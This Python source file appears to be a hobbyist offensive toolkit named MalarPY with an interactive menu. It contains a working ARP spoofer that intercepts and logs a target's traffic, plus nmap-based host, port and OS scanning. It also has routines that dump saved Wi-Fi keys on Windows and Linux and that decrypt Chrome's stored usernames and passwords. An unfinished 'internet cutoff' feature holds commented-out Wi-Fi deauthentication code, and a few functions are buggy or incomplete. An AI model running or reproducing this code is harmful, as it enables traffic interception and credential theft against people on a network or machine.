# On startup, malarpy will check for uninstalled python modules and prompt the user to install them in order to avoid execution errors
import pkg_resources
import sys
import subprocess

required = {"scapy", "pycryptodome", "pypiwin32", "pyfiglet", "python-nmap", "netifaces", "requests", "python-whois", "pick", "phonenumbers"}
installed = {pkg.key for pkg in pkg_resources.working_set}
missing = required - installed

if missing:
    install = input(f"You got {len(missing)} missing modules. Would you like to install them? (Y/N): ").upper()
    
    if install == "Y":
        python = sys.executable
        subprocess.check_call([python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
        print("\033[1;37;40m") # Sets terminal color back to white bc pip is dumb
    else:
        sys.exit()

from scapy import interfaces
import scapy.all as scapy
from scapy.layers.dot11 import Dot11

from pick import pick # Pick is used to create interactive menus
import time
import ipaddress
import pyfiglet
import os
import nmap
import netifaces
import socket
import winreg
import threading
import pyfiglet
from pick import pick # Pick is used to create interactive menus
import time
import whois
import re
from collections import namedtuple
import configparser
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


import phonenumbers
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers import timezone

from help import *
from util import *

# Available flags
flags = {
    "gateway": "-gt",
    "target" : "-t",
    "verbose": "-v",
    "showPkt": "-s"
}

# Available menu options
options = [
    "ARP Spoofer",
    "ARP Table",
    "Port Scanner",
    "OS Detection",
    "Connected Machines",
    "Internet Cutoff",
    "Whois Query",
    "Phone Info",
    "Get Wi-fi Passwords",
    "Get Chrome Passwords",
    "Help",
    "Quit"
]

# Returns the IPv4 of the default gateway
def getDefaultGateway():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]


# Returns the IP corresponding to a specified domain name
def resolveDomain(domain):
    try:
        return socket.gethostbyname_ex(domain)[2][0]
    
    except:
        print(f"Unable to resolve domain '{domain}'")
        return 1


# Check if passed IP address is a valid IP address
def isValidIP(ip):
    try:
        ipAddress = ipaddress.ip_address(ip)
        return True, str(ipAddress) # Convert output to string as scapy takes IP (str) as argument
    
    except ValueError:
        return False, ip

# Convert IP from dec form to bin form
def ipToBin(ip):
    return [bin(int(x)+256)[3:] for x in ip.split('.')] # Returns array of 4 binary octets

# Different function to convert an IP to binary (used to validate an IP in the ARP Spoofer)
def ip2Bin(ip):
    octetListInt = ip.split(".")
    octetListBin = [format(int(i), '08b') for i in octetListInt]
    binary = ("").join(octetListBin)
    return binary

# Returns my network interface
def getMyInterface(ip):
    interfaces = netifaces.interfaces() # Get all network interfaces of my machine

    # Loop through the interfaces and look for the main one
    for interface in interfaces:
        ifaddrInterface = netifaces.ifaddresses(interface)
        if ifaddrInterface.get(2) != None:

            if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4
                return interface # Return my interface

# Get your subnet mask (use it to calculate network ID)
def getSubnetMask(ip):
    interfaces = netifaces.interfaces() # Get all network interfaces of the machine
    mask = None
    maskBits = 0

    # Loop through the interfaces and look for the main one
    for interface in interfaces:        
        ifaddrInterface = netifaces.ifaddresses(interface)
        if ifaddrInterface.get(2) != None:

            if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4:
                
                mask = ifaddrInterface[2][0]['netmask'] # Return the network mask
                break
    
    # Return the amount of `1` bits of the network mask
    binMask = "".join(ipToBin(mask))
    
    # Loop through binary string and count the amount of `1` bits until a `0` is found
    for bit in binMask:
        if bit == '1':
            maskBits = maskBits + 1
        
        else:
            break

    return maskBits

# BC socket.gethostbyname() is dumb, I have to send a UDP request to some DNS server in order to get my actual IPv4
# If you dont do this, socket.gethostbyname() may return the wrong adapter, like Ethernet 2.
#
# Warning: You must be connected to the internet because, well... you have to connect to a DNS server
def getMyIPv4():
    # Create a datagram socket (single UDP request and response, then close)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Connect to an address on the internet that's likely to always be up (cmon google I need you now)
    sock.connect(("8.8.8.8", 80))
    # After connecting, the socket will have your IPv4 in its address field
    return(sock.getsockname()[0])


# Get all hosts connected to your network
# The 'me' flag determines if your own IPv4 is to be displayed in the list (default = True)
# The 'gw' flag determines if the default gateway is to be displayed in the list (default = True)
def getNetworkIPs(me = True, gw = True):
    # Get your IPv4
    IPAddr = getMyIPv4()

    subnetMask = '/' + str(getSubnetMask(IPAddr))

    # Try to fetch hosts with nmap
    nm = nmap.PortScanner()
    result = nm.scan(IPAddr + subnetMask, arguments = '-sn')
    allHosts = nm.all_hosts()

    # Remove my IPv4 from the list if the flag is set to false
    if not me:
        if IPAddr in allHosts:
            allHosts.remove(IPAddr)

    # Remove the default gateway from the list if the flag is set to false
    if not gw:
        defaultGateway = getDefaultGateway()
        if defaultGateway in allHosts:
            allHosts.remove(defaultGateway)


    if len(allHosts) > 0:
        return allHosts

    else:
        print("No hosts found...")
        time.sleep(2)
        return


# Enables ip forwarding on my machine in order to route the packets transmited by the target
#
# By itself the spoof() function cuts the access to the internet to the specified target by making the packets pass through my machine
# In order to get any valuable information we must let the targeted machine reach the internet. Therefore we must do the router's job
#
# IP routing can be enabled on Linux by running the following command 'echo 1 >> /proc/sys/net/ipv4/ip_forward'
# The same can be done on Windows by changing a registry key in 'HKEY_LOCAL_MACHINE \SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter'
def setIPForwarding(setKey):
    osName = getHostOS() # Get host operating system

    registryPath = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" # Path to the registry key (Windows)
    linuxCommand = "echo {} >> /proc/sys/net/ipv4/ip_forward".format(int(setKey)) # Command for Linux
    
    print("[+] Attempting to enable/disable IP forwarding")

    if osName == 'nt': # Change the Registry Key if the Host is on Windows
        try:
            # Get necessary key
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
            storedValue = winreg.QueryValueEx(key, "IPEnableRouter")[0] # Get previously stored value

            # If the registry key is already set to 1, don't do anything
            if storedValue == int(setKey) and storedValue == 1:
                print("[+] Your machine is already configured to route incomming packets")
                time.sleep(1)
                return 1

            elif storedValue == int(setKey) and storedValue == 0:
                print("[+] Your machine is already configured not to route incomming packets")
                time.sleep(1)
                return 1 

            # If the key is not yet set, set it
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, int(setKey))
            winreg.CloseKey(key)
            print("[+] Successfully updated Windows Registry!")
            return 1

        except:
            print("[+] An error has occured when attempting to read/write to the Windows Registry. Try running the terminal as admin...")
            waitForKeyStroke()
            return 0

    else: # Do the same for Linux (See how much time I saved implementing the same shit for Linux? I would suck your toes, Linus Torvalds)
        try:
            os.system(linuxCommand)
            return 1
        except:
            print("[+] An error has occured when attempting to enable/disable IP forwarding. Try running the terminal as root...")
            waitForKeyStroke()
            return 0
    

def dumpPackets(packet):
    if packet.haslayer(scapy.ARP) == False:
        print(packet.summary())

# Intercept packets
def sniffPackets(target, port = None , _type = "any"):
    while do:
        if _type == "any":
            scapy.sniff(filter = f"host {target}", prn = dumpPackets, count=1)
        elif port:
            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)
        else:
            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)

# ARP Spoofer helper function (sends malicious ARP packet)
def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True, summary = True):
    t = threading.Thread(target=sniffPackets, args=(targetIP, None, "tcp",))
    t.setDaemon(True)
    flag = False
    global do
    do = True

    try:
        isForwardSet = setIPForwarding(allowThrough) # Enable/Disable IP forwarding

        # If IP forwarding was successfuly altered:
        if isForwardSet == 1:
            print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))

            while True:
                # Create 2 packets. One will be sent to the default gateway, the other one to the target's machine
                packet1 = scapy.ARP(op = 2, hwdst = gatewayMAC, pdst = gatewayIP, psrc = targetIP) # This packet will be sent to the default gateway
                packet2 = scapy.ARP(op = 2, hwdst = targetMAC, pdst = targetIP, psrc = gatewayIP) # This packet will be sent to the target machine

                # Send both packets
                scapy.send(packet1, verbose = False)
                scapy.send(packet2, verbose = False)

                if not flag:
                    t.start()
                    flag = True

                # Sleep for 2 seconds (Send an ARP response every 2 seconds)
                time.sleep(2)

        
        else:
            print("Unable to set IP forwarding to '{}'... quiting".format(int(allowThrough)))
            time.sleep(1.5)
            
    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Exiting ARP Spoofer...")
        
        do = False
    
        time.sleep(1.5)
        return


# Returns the network address given an IP and a subnet MASK in the CIDR notation (192.168.1.109/24 for example)
def getNetworkAddress(IP, MASKsize):
    # Convert IP address to 32 bit binary
    ipBin = ip2Bin(IP)
    # Extract network ID from 32 bit binary
    network = ipBin[0:32-(32-MASKsize)]
    return network


# Checks if an IP belongs to my network
def isInMyNetwork(IP, prefix):
    # Get the network address of the given IP and compare it to mine
    targetID = getNetworkAddress(IP, prefix)
    myID = getNetworkAddress(getMyIPv4(), prefix)
    return targetID == myID


# Checks if a host belongs to the same network as me
def validateHost(IP):
    myIP = getMyIPv4()
    mask = getSubnetMask(myIP)

    return isInMyNetwork(IP, mask)



# Get MAC address from IP
def getMAC(ip, verbose = False, showPacket = False):
    # Find MAC Address of the specified IP by sending an ARP request to the broadcast MAC Address
    # (Ask the entire network what's the MAC address of the specified IP)


    # Create Ethernet layer for broadcasting
    etherLayer = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # Ethernet layer packet has 3 parameters: destination MAC address, source MAC Address, type
    # Create ARP layer
    arpLayer = scapy.ARP(op = "who-has", pdst = ip)

    # Create full packet
    fullPacket = etherLayer/arpLayer

    if showPacket:
        print("Full packet sent: \n")
        fullPacket.show()

    # Get response from the request
    try:
        res = scapy.srp(fullPacket, timeout = 2, verbose = verbose)[0]

        # Return MAC Address
        return res[0][1].hwsrc

    except:
        print("Unable to get MAC Address for [{}]".format(ip))
        return 0

def ARPSpoofer():
    asciiBanner = pyfiglet.figlet_format("ARP Spoofer")

    options = ["Manual selection", "Find hosts (recommended)", "Quit"]
    option, index = pick(options, asciiBanner, indicator = ">", default_index = 0)

    clearTerminal()
    print(asciiBanner)

    if index == 0:
        try:
            IP2Spoof = ""

            # Get the IP to spoof
            while True: 
                clearTerminal()
                print(asciiBanner)
                IP2Spoof = input("Insert an IP to spoof: ")

                if isValidIP(IP2Spoof)[0]: # The first return value [0] of isValidIP() is a True/False flag that indicates if a given IP is valid
                    break

                print("'{}' Is not a valid IP address".format(IP2Spoof))
                time.sleep(0.5)

            # Get the gateway/router
            defaultGateway = getDefaultGateway()
            gw = ""

            while True:
                clearTerminal()
                print(asciiBanner)
                gw = input("Insert the gateway/router IP (default '{}'): ".format(defaultGateway))

                if gw == "":
                    gw = defaultGateway
                    break

                elif isValidIP(gw)[0]:
                    break

                print("'{}' Is not a valid IP address".format(gw))
                time.sleep(0.5)

            print("[+] Target IP: {}".format(IP2Spoof))
            print("[+] Gateway: {}".format(gw))
            time.sleep(0.5)

            print("Validating target's IP...")
            isValid = validateHost(IP2Spoof)
            # If the target doesn't belong to the same network as me, exit
            if not isValid:
                print("The specified IP address '{}' does not belong to the same network as you".format(IP2Spoof))
                waitForKeyStroke()
                return

            time.sleep(1.5)

            print("Validating gateway IP...")
            isValidGW = validateHost(gw)

            if not isValidGW:
                print("The specified gateway '{}' cannot be reached".format(gw))
                waitForKeyStroke()
                return
            

            # Only spoof the target if the hosts are validated
            if isValid and isValidGW:
                # Check if the hosts are UP before trying to spoof them
                time.sleep(1.5)
                print("Checking if hosts are UP...")
                scanner = nmap.PortScanner()
                time.sleep(1)
                print("[+] Pinging '{}'".format(IP2Spoof))
                scanner.scan(IP2Spoof, '1', '-v')
                stateTarget = scanner[IP2Spoof].state()
                
                if stateTarget != 'up':
                    print("[+] Target is [DOWN]")
                else:
                    print("[+] Target is [UP]")

                time.sleep(1)
                print("[+] Pinging '{}'".format(gw))
                scanner.scan(gw, '1', '-v')
                stateGW = scanner[gw].state()

                if stateGW != 'up':
                    print("[+] Gateway is [DOWN]")
                else:
                    print("[+] Gateway is [UP]")
                
                # If both of the hosts are UP, the spoofing can start
                if stateGW == 'up' and stateTarget == 'up':
                    print("Starting the spoofer...")
                    
                    # Get MAC addresses of the target and the gateway
                    targetMAC = getMAC(IP2Spoof)
                    gwMAC = getMAC(gw)

                    if targetMAC == 0 and gwMAC != 0:
                        print("Unable to get MAC address for '{}' (target)".format(IP2Spoof))
                        print("The ARP Spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return
                    elif targetMAC != 0 and gwMAC == 0:
                        print("Unable to get MAC address for '{}' (gateway)".format(gw))
                        print("The ARP Spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return
                    elif targetMAC == 0 and gwMAC == 0:
                        print("Unable to get both MAC addresses (target and gateway)")
                        print("The ARP spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return

                    logIt = input("Would you like to get a log of the incomming packets? (y/n):")
                    print("[+] Logging all TCP/IP packets... (packets may take a while to appear on the logger)")

                    if logIt.upper == "Y":
                        spoof(IP2Spoof, targetMAC, gw, gwMAC, summary=True) # Start the spoofer
                    elif logIt.upper == "N":
                        spoof(IP2Spoof, targetMAC, gw, gwMAC) # Start the spoofer
        
                    
                elif stateGW != 'up' or stateTarget != 'up':
                    print("One of the hosts is not UP...")
                    waitForKeyStroke()

                else:
                    print("None of the hosts are up...")
                    waitForKeyStroke()
        
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected, exiting...")
            time.sleep(1.5)



    elif index == 1:
        try:
            print("Fetching the network... this may take a moment")

            allHosts = getNetworkIPs(False, True)

            if len(allHosts) == 0:
                print("Quiting")
                time.sleep(0.7)
                    
            else:
                print("Found {} host/s".format(len(allHosts)))
                time.sleep(1)

                for i in range(0, len(allHosts)):
                    try:
                        print("{} - {} ({})".format(i + 1, allHosts[i], socket.gethostbyaddr(allHosts[i])[0]))
                    except:
                        print("{} - {} ({})".format(i + 1, allHosts[i], "Unable to find hostname"))
                    
                IP2Spoof = int(input("Select an IP to spoof: "))
                targetIP = allHosts[IP2Spoof - 1]


                # Get the MAC address of the specified IP address
                MACTarget = getMAC(targetIP)

                # Get MAC address of the default gateway
                defaultGateway = getDefaultGateway()
                dfGWMAC = getMAC(defaultGateway)

                if MACTarget == 0 and dfGWMAC != 0:
                     print("Unable to get MAC address for '{}' (target)".format(targetIP))
                     print("The ARP Spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return
                elif MACTarget != 0 and dfGWMAC == 0:
                     print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
                     print("The ARP Spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return
                elif MACTarget == 0 and dfGWMAC == 0:
                     print("Unable to get both MAC addresses (target and gateway)")
                     print("The ARP spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return

                logIt = str(input("Would you like to get a log of the incomming packets? (y/n):"))
                print("[+] Logging all TCP/IP packets... (packets may take a while to appear on the logger)")

                if logIt.upper() == "Y":
                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, summary=True) # Start the spoofer
                elif logIt.upper() == "N":
                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC) # Start the spoofer

            
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected, exiting...")
            time.sleep(1.5)

    elif index == 2:
        return


# Gets all the machines connected to your network
def connectedMachines():
    asciiBanner = pyfiglet.figlet_format("Connected Machines")

    allMachines = []
    size = 0

    clearTerminal()
    print(asciiBanner)
    getNames = input("Would you like to attempt to fetch the hostnames of every machine? (Not recommended for large networks) (y/n):")
    print("Fetching your network... This may take a while (CTRL+C to exit)")

    try:
        allMachines = getNetworkIPs()
        size = len(allMachines)
    except KeyboardInterrupt:
        print("Keyboard interrupt detected, exiting...")
        time.sleep(1.7)

    if size > 0:
        print("[+] Found {} machines!".format(size))
        for i in range(0, size):
            try:
                if getNames.upper() == "Y":
                    if allMachines[i] == getDefaultGateway():
                        print("{} - {} ({} | Default Gateway)".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))
                    else:
                        print("{} - {} ({})".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))
            
                else:
                    if allMachines[i] == getDefaultGateway():
                        print("{} - {} | Default Gateway".format(i + 1, allMachines[i]))
                    else:
                        print("{} - {}".format(i + 1, allMachines[i]))
            except:
                print(f"{i} - {allMachines[i]} (Name not found)")

        print("\n")
        waitForKeyStroke()

# Cuts off access to the internet to the specified host (works most of the time)
def internetCutoff():
    asciiBanner = pyfiglet.figlet_format("Internet Cutoff")

    allMachines = []
    size = 0

    clearTerminal()
    print(asciiBanner)
    print("Please wait while we fetch your network for hosts... (CTRL+C to exit)")

    try:
        allMachines = getNetworkIPs(False, False) # 'False' flags indicate I don't want to list my IPv4 nor my default gateway
        size = len(allMachines)

    except KeyboardInterrupt:
        print("Keyboard interrupt detected, exiting...")
        time.sleep(1.7)

    if size > 0:
        print("[+] Found {} machines!".format(size))
        for i in range(0, size):
            try:
                print("{} - {} ({})".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))
            except:
                print("{} - {} ({})".format(i + 1, allMachines[i], "Unable to get hostname"))

        print("{} - All".format(size + 1))

        IP2Cut = int(input("Choose the host you wish to cut access to the internet: "))
        targetIP = allMachines[IP2Cut - 1]

        # Get the MAC address of the specified IP address
        MACTarget = getMAC(targetIP)

        # Get MAC address of the default gateway
        defaultGateway = getDefaultGateway()
        dfGWMAC = getMAC(defaultGateway)

        if MACTarget == 0 and dfGWMAC != 0:
                print("Unable to get MAC address for '{}' (target)".format(targetIP))
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return
        elif MACTarget != 0 and dfGWMAC == 0:
                print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return
        elif MACTarget == 0 and dfGWMAC == 0:
                print("Unable to get both MAC addresses (target and gateway)")
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return


        #dot11 = Dot11(addr1=MACTarget, addr2=dfGWMAC, addr3=dfGWMAC)
        #packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)
        #scapy.sendp(packet, inter=0.1, count=100, iface ="wlan0mon", verbose=1)


# Show ARP table
def ARPTable():
    asciiBanner = pyfiglet.figlet_format("ARP Table")
    clearTerminal()
    print(asciiBanner)

    lines = os.popen('arp -a')

    for line in lines:
        print(line)

    waitForKeyStroke()


def isReachable(host):
    return True if os.system("ping -c 1 " + host) == 0 else False


def whoisQuery():
    asciiBanner = pyfiglet.figlet_format("Whois")
    clearTerminal()
    print(asciiBanner)

    target = input("Insert an IP/Domain Name to search: ")
    
    print("Fetching info...")

    time.sleep(1)
    clearTerminal()
    print(asciiBanner)

    print(f"[+] Whois query info for '{target}': \n")
    res = whois.whois(target)

    print(res)

    waitForKeyStroke()


def phoneInfo():
    asciiBanner = pyfiglet.figlet_format("Phone Info")
    clearTerminal()
    print(asciiBanner)

    phone = input("Insert target's phone number (eg +1 1234567890): ")
    
    try:
        targetPhone = phonenumbers.parse(phone)
        print(f"\n[+] Phone info for: {phone}")
        print(targetPhone)
        print("Country: ", geocoder.description_for_number(targetPhone, 'en'))

        timeZone = timezone.time_zones_for_number(targetPhone)
        print("Timezone: ", timeZone)

        print("Service provider: " + carrier.name_for_number(targetPhone, 'en') + "\n")
    
    except:
        print("Something went wrong when attempting to parse phone number. Is it formated correctly?")
    
    waitForKeyStroke()


def regularPortScan(scanner):
    asciiBanner = pyfiglet.figlet_format("Regular Scan")
    clearTerminal()
    print(asciiBanner)

    try:

        target = resolveDomain(input("Insert target's IP/domain: "))

        if target != 1:

            print(f"[+] Scanning {target}")
            print("[+] This may take a bit... (CTRL + C to exit)")

            scanner.scan(target)
            openPorts = scanner[target]['tcp'].keys()

            print(f"[+] Target status: [{scanner[target].state()}] | Found {len(openPorts)} open ports!\n")

            if len(openPorts) > 0:

                for port in openPorts:
                    print(f"-> Port [{port}] Open")

            print("\n")
            waitForKeyStroke()
        
        else:
            waitForKeyStroke()
    
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting Regular Scan...")
        time.sleep(1.5)

def synAckScan(scanner):
    asciiBanner = pyfiglet.figlet_format("Syn-Ack Scan")
    clearTerminal()
    print(asciiBanner)

    

def portScannerMenu(options, banner):

    option, index = pick(options, banner, indicator = ">", default_index=0)
    return option, index


def portScanner():
    options = [
        "Regular Scan",
        "SYN/ACK Scan",
        "UDP Scan",
        "Comprehensive Scan",
        "Quit"
    ]

    asciiBanner = pyfiglet.figlet_format("Port Scanner")
    
    clearTerminal()
    scanner = nmap.PortScanner() # Initialize port scanner

    try:
        option, index = portScannerMenu(options, asciiBanner) # Get user option

        if option == "Regular Scan":
            regularPortScan(scanner)

        elif option == "Quit":
            return

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting Port Scanner...")
        time.sleep(1.5)


def osDetection():
    asciiBanner = pyfiglet.figlet_format("OS Detection")
    clearTerminal()
    print(asciiBanner)

    scanner = nmap.PortScanner()

    try:
        target = resolveDomain(input("Enter target's IP/domain: "))

        if target != 1:

            try:
                osInfo = scanner.scan(target, arguments="-O")['scan'][target]['osmatch'][1]
            except:
                print(f"Unable to get OS Info for {target}...\n")
                waitForKeyStroke()
                return


            osName = osInfo['name']
            accuracy = osInfo['accuracy']
            osClass = osInfo['osclass']
            osType = osClass[0]['type']
            osVendor = osClass[0]['vendor']
            osFamily = osClass[0]['osfamily']
            osGeneration = osClass[0]['osgen']

            print(f"[+] OS Info for {target}:")
            print(f"-> Name: {osName} ({accuracy}% accuracy)")
            print(f"-> Type: {osType}")
            print(f"-> Vendor: {osVendor}")
            print(f"-> Family: {osFamily}")
            print(f"-> Generation: {osGeneration}\n")


            waitForKeyStroke()
        
        else:
            waitForKeyStroke()
    
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting OS Detection...")
        time.sleep(1.5)


def getWindowsSavedSsids():
    # Returns a list of saved SSIDs in a Windows machine using netsh command
    # get all saved profiles in the PC
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []

    profiles = re.findall(r"All User Profile\s(.*)", output)
    
    for profile in profiles:
        # for each SSID, remove spaces and colon
        ssid = profile.strip().strip(":").strip()
        # add to the list
        ssids.append(ssid)
    
    return ssids

def print_windows_profile(profile):
    """Prints a single profile on Windows"""
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")

def getWindowsSavedWifiPasswords(verbose=True):
    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
    command in Windows
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
    """
    ssids = getWindowsSavedSsids()
    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
    profiles = []
    for ssid in ssids:
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        # get the ciphers
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
        # clear spaces and colon
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
        # get the Wi-Fi password
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        # clear spaces and colon
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
        if verbose == True:
            print_windows_profile(profile)
        profiles.append(profile)
    return profiles

def printWindowsWifiPasswords(verbose):
    print("SSID                     CIPHER(S)      KEY")
    print("-"*50)
    getWindowsSavedWifiPasswords(verbose)


def print_linux_profile(profile):
    """Prints a single profile on Linux"""
    print(f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}") 


def getLinuxSavedWifiPasswords(verbose=1):   
    """Extracts saved Wi-Fi passwords saved in a Linux machine, this function extracts data in the
    `/etc/NetworkManager/system-connections/` directory
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
    """
    network_connections_path = "/etc/NetworkManager/system-connections/"
    fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
    Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
    profiles = []

    for file in os.listdir(network_connections_path):
        data = { k.replace("-", "_"): None for k in fields }
        config = configparser.ConfigParser()
        config.read(os.path.join(network_connections_path, file))
        
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace("-", "_")] = v
        
        profile = Profile(**data)
        
        if verbose >= 1:
            print_linux_profile(profile)
        profiles.append(profile)
    
    return profiles

def printLinuxWifiPasswords(verbose):
    """Prints all extracted SSIDs along with Key (PSK) on Linux"""
    print("SSID                     AUTH KEY-MGMT  PSK")
    print("-"*50)
    getLinuxSavedWifiPasswords(verbose)

def getWifiPasswords(verbose):
    """Prints all extracted SSIDs along with Key on Windows"""
    clearTerminal()
    asciiBanner = pyfiglet.figlet_format("Wi-fi Keys")
    print(asciiBanner)
    
    os = getHostOS()
    if os == "nt":
        printWindowsWifiPasswords(verbose)
    else:
        printLinuxWifiPasswords(verbose)

    waitForKeyStroke()



def getChromeDatetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def getEncryptionKey():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



def decryptPassword(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""



def getChromePasswords():
    asciiBanner = pyfiglet.figlet_format("Chrome Passwords")
    clearTerminal()
    print(asciiBanner)

    # get the AES key
    key = getEncryptionKey()

    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    # iterate over all rows
    for row in cursor.fetchall():
        
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decryptPassword(row[3], key)
        date_created = row[4]
        date_last_used = row[5]  

        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue

        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(getChromeDatetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(getChromeDatetime(date_last_used))}")
        print("="*50)

    cursor.close()
    db.close()

    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass

    waitForKeyStroke()



# Display main menu
def menu():
    asciiBanner = pyfiglet.figlet_format("MalarPY")

    option, index = pick(options, asciiBanner, indicator = ">", default_index = 0)
    return option, index

def main(argv):
    argv.append("") # Add empty argument in the end bc I am too lazy
    gateway = ""
    target = ""
    verbose = False
    showPacket = False

    if len(argv) > 1:
        
        for i in range(len(argv)): # Gateway argument
            if argv[i] == flags["gateway"] and argv[i+1] not in flags:
                
                isValid, ip = isValidIP(argv[i+1]) # Check if the IP is valid
                gateway = ip

                if not isValid:
                    print("Specified gateway ({}) is not a valid IP address".format(ip))
                    break

            elif argv[i] == flags["target"] and argv[i+1] not in flags:

                isValid, ip = isValidIP(argv[i+1])
                target = ip

                if not isValid:
                    print("Specified target ({}) is not a valid IP address".format(ip))
                    break
            
            elif argv[i] == flags["verbose"]:
                verbose = True

            elif argv[i] == flags["showPkt"]:
                showPacket = True
        
        # Get MAC addresses
        print("MAC address of target = {}".format(getMAC(target, verbose, showPacket)))

    else: # If the user does not pass any arguments start the menu
        while True:

            option, index = menu()
        
            print("Starting {}".format(option))
        
            if option == "ARP Spoofer": # Call the ARP Spoofer function
                ARPSpoofer()
            
            if option == "ARP Table": # Call ARP table
                ARPTable()

            if option == "Connected Machines": # Call connected machines function
                connectedMachines()

            if option == "Internet Cutoff": # Call internet cutoff function
                internetCutoff()

            if option == "Whois Query":
                whoisQuery()

            if option == "Phone Info":
                phoneInfo()

            if option == "Port Scanner":
                portScanner()
            
            if option == "OS Detection":
                osDetection()

            if option == "Get Wi-fi Passwords":
                getWifiPasswords(True)
            
            if option == "Get Chrome Passwords":
                getChromePasswords()

            if option == "Help":
                help()

            if option == "Quit":
                clearTerminal()
                os._exit(0)
    
if __name__ == "__main__":
    main(sys.argv[1:])
